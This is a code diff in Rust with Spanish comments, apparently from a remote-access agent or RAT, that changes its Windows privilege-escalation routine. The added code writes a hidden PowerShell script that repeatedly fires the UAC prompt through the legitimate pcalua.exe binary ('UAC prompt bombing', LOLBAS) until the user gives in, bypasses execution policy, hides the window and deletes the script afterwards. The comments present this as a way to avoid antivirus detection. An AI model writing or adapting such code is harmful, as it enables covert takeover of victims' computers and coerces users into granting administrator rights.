@@ -461,7 +461,7 @@ fn execute_command(command: &str) -> String {
 /// MEJORADO: NO copia archivos (detectado por AVs), ejecuta desde ubicación original
 #[cfg(target_os = "windows")]
 fn elevate_agent() -> String {
-    debug_print!("DEBUG: Re-ejecutando agente con privilegios elevados...");
+    debug_print!("DEBUG: Re-ejecutando agente con privilegios elevados (UAC prompt bombing + LOLBAS)...");
     
     // Obtener la ruta del ejecutable actual
     let current_exe = match std::env::current_exe() {
@@ -582,60 +582,80 @@ fn copy_to_stealth_location(current_exe: &std::path::Path) -> Result<std::path::
 
 */
 
-/// Re-ejecuta el agente usando VBScript (más sigiloso, sin PowerShell)
+/// Re-ejecuta el agente usando pcalua.exe con UAC prompt bombing (LOLBAS)
+/// Esta técnica usa el Program Compatibility Assistant (pcalua.exe) que es un binario
+/// legítimo de Windows, haciéndolo menos sospechoso que PowerShell directo.
+/// Además implementa "UAC prompt bombing" - sigue mostrando el prompt hasta que el usuario acepte.
 #[cfg(target_os = "windows")]
 fn elevate_agent_via_vbs(exe_path: &str) -> Result<String, String> {
     use std::process::Command;
     use std::os::windows::process::CommandExt;
     
     let temp_dir = std::env::temp_dir();
-    let vbs_name = format!("~elv{}.vbs", std::process::id());
-    let vbs_path = temp_dir.join(&vbs_name);
+    let ps_name = format!("~elv{}.ps1", std::process::id());
+    let ps_path = temp_dir.join(&ps_name);
     
-    // VBScript que re-ejecuta el agente con privilegios elevados
-    // ShellExecute con "runas" muestra el UAC prompt
-    let vbs_content = format!(
-        r#"Set UAC = CreateObject("Shell.Application")
-UAC.ShellExecute "{}", "", "", "runas", 0"#,
-        exe_path.replace("\\", "\\\\")
+    // Script PowerShell que usa pcalua.exe (LOLBAS) con UAC prompt bombing
+    // pcalua.exe es el "Program Compatibility Assistant" - binario legítimo de Windows
+    // El loop continúa mostrando el UAC prompt hasta que el usuario lo acepte
+    let ps_content = format!(
+        r#"try {{
+    throw ""
+}} catch {{
+    while (-not $?) {{
+        try {{
+            Start-Process pcalua.exe -ArgumentList "-a `"{}`"" -Verb RunAs -ErrorAction Stop
+            break
+        }} catch {{
+            Write-Error "" -ErrorAction SilentlyContinue
+        }}
+    }}
+}}"#,
+        exe_path.replace("\"", "`\"")
     );
     
-    if let Err(_) = fs::write(&vbs_path, vbs_content) {
-        return Err("Failed to create VBS file".to_string());
+    if let Err(_) = fs::write(&ps_path, ps_content) {
+        return Err("Failed to create PowerShell script".to_string());
     }
     
-    // Ejecutar VBScript con wscript
-    let output = Command::new("wscript")
+    // Ejecutar el script de PowerShell en segundo plano
+    // Esto iniciará el UAC prompt bombing
+    let output = Command::new("powershell")
         .args(&[
-            "//NoLogo",
-            "//B", // Batch mode (sin UI)
-            vbs_path.to_str().unwrap()
+            "-NoProfile",
+            "-NonInteractive",
+            "-ExecutionPolicy", "Bypass",
+            "-WindowStyle", "Hidden",
+            "-File",
+            ps_path.to_str().unwrap()
         ])
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .spawn();
     
-    // Limpiar archivo VBS después de un momento
+    // Limpiar archivo PowerShell después de un momento
     std::thread::sleep(std::time::Duration::from_millis(500));
-    let _ = fs::remove_file(&vbs_path);
+    let _ = fs::remove_file(&ps_path);
     
     match output {
         Ok(_) => Ok(format!(
-            "__SUCCESS__:Agente re-ejecutado con privilegios elevados. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
+            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (LOLBAS: pcalua.exe). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
             DELIMITER
         )),
-        Err(e) => Err(format!("VBScript execution failed: {}", e)),
+        Err(e) => Err(format!("pcalua.exe elevation failed: {}", e)),
     }
 }
 
-/// Re-ejecuta el agente usando PowerShell (fallback)
+/// Re-ejecuta el agente usando PowerShell con UAC prompt bombing (fallback)
+/// Esta versión también implementa UAC prompt bombing pero sin usar pcalua.exe
 #[cfg(target_os = "windows")]
 fn elevate_agent_via_powershell(exe_path: &str) -> String {
     use std::process::Command;
     use std::os::windows::process::CommandExt;
     
-    // PowerShell Start-Process con -Verb RunAs
+    // PowerShell con UAC prompt bombing
+    // Similar a la técnica de pcalua.exe pero como fallback directo
     let ps_script = format!(
-        "Start-Process -FilePath '{}' -Verb RunAs",
+        "try {{ throw \"\" }} catch {{ while (-not $?) {{ try {{ Start-Process -FilePath '{}' -Verb RunAs -ErrorAction Stop; break }} catch {{ Write-Error \"\" -ErrorAction SilentlyContinue }} }} }}",
         exe_path.replace("'", "''")
     );
     
@@ -653,11 +673,11 @@ fn elevate_agent_via_powershell(exe_path: &str) -> String {
     
     match output {
         Ok(_) => format!(
-            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (PowerShell). Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
+            "__SUCCESS__:Agente re-ejecutado con privilegios elevados (PowerShell + UAC bombing). UAC prompt se mostrará hasta que sea aceptado. Conexión actual se cerrará. El agente elevado se reconectará automáticamente.{}", 
             DELIMITER
         ),
         Err(e) => format!(
-            "__ERROR__:Error al re-ejecutar agente con privilegios: {} (¿Usuario rechazó UAC?){}", 
+            "__ERROR__:Error al re-ejecutar agente con privilegios: {}{}", 
             e, DELIMITER
         ),
     }
